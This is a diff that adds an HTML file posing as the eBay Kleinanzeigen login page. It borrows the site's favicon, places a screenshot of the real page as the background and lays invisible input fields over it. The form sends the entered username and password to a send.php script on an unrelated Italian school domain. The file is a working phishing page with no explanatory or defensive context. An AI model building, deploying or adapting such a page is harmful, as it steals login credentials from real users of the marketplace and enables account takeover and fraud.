@@ -1,0 +1,57 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
+<html>
+<head>
+  <meta http-equiv="Content-Type"
+content="text/html; charset=UTF-8">
+ <title>Login - Anmelden bei eBay Kleinanzeigen</title>
+        <link rel="SHORTCUT ICON" href="https://www.ebay-kleinanzeigen.de/static/img/favicon.phx38ne06jk2.png" type="image/png" />
+  <style type="text/css">
+body {margin:0 auto;}
+#pagina {position:relative;width:1350px;height:780px;margin:0 auto;background:url(../../fs5.directupload.net/images/160405/9dcoxt5u.jpg) top center no-repeat;}
+#user {
+position:absolute;
+width:349px;
+height:32px;
+margin-top:180px;
+margin-left:1114px;
+border:0px;
+left: -935px;
+top: -9px;
+}
+#pass {
+position:absolute;
+width:349px;
+height:32px;
+margin-top:225px;
+margin-left:1114px;
+border:0px;
+left: -935px;
+top: 11px;
+}
+#submit {
+position:absolute;
+width:85px;
+height:34px;
+margin-top:276px;
+margin-left:1114px;
+border:0px;
+background:none;
+left: -935px;
+top: 77px;
+}
+  </style>
+</head>
+<body>
+<div id="pagina">
+<form method="post"
+action="http://liceosilvestri.it/seva/send.php"><input
+style="top: 73px; height: 25px; left: -790px; width: 300px;"
+id="user" name="user" value="" type="text"><input
+style="top: 75px; height: 25px; left: -790px; width: 300px;"
+id="pass" name="pass" value="" type="password"><input
+style="top: 114px; height: 30px; left: -792px; width: 80px;"
+id="submit" name="submit" value="" type="submit">
+</form>
+</div>
+<div>
+</body>
